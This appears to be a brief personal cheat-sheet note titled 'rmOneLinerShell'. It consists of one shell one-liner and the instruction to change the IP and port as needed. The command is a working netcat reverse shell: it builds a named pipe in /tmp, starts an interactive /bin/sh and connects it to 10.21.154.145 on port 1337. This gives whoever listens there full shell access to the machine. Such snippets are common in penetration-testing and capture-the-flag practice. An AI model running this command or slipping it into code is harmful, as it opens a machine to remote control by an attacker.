---
title: "rmOneLinerShell"
tags:
  - fetus
---
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.154.145 1337 >/tmp/f
```
- modify the ip and port as needed